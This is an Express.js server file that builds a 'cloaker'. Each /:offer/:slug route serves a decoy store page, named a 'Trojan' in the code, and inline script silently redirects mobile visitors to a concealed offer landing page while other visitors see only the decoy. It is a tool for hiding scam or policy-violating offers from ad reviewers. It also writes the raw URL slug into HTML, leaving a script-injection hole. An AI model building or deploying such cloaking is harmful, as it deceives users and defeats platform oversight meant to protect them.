const express = require('express');
const app = express();
const path = require('path');
const fs = require('fs');

// Serve static files from the public directory
app.use(express.static(path.join(__dirname, 'public')));

// Middleware to handle requests to /:offer/:slug
app.get('/:offer/:slug', (req, res, next) => {
    const { offer, slug } = req.params;
    const destinationLander = `/public/${offer}.html`;
    
    fs.access(destinationLander, fs.constants.F_OK, (err) => {
        if (err) {
            // If the landing page file doesn't exist, return a 404 error
            res.status(404).send('Offer not found');
        } else {
            // Serve the landing page if it exists
            const trojanHTML = `
                <!DOCTYPE html>
                <html lang="en">
                <head>
                    <meta charset="UTF-8">
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <script>
                        // Cloaker logic
                        const urlParams = new URLSearchParams(window.location.search);
                        const utmXXX = urlParams.get("xxx");
                        const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

                        if (utmXXX === "__PLACEMENT__") {
                            // Do nothing
                        } else if (isMobileDevice) {
                            window.location.href = "${destinationLander}";
                        } else {
                            // Other logic if needed
                        }
                    </script>
                    <title>${slug}</title>
                </head>
                <body>
                    <h1>Welcome to our Store!</h1>
                    <p>You are shopping at: ${slug}</p>
                </body>
                </html>
            `;
            res.send(trojanHTML);
            console.log(`Served ${offer} Trojan (${slug})`);
        }
    });
});

// Start the HTTP server
const PORT = 8080;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
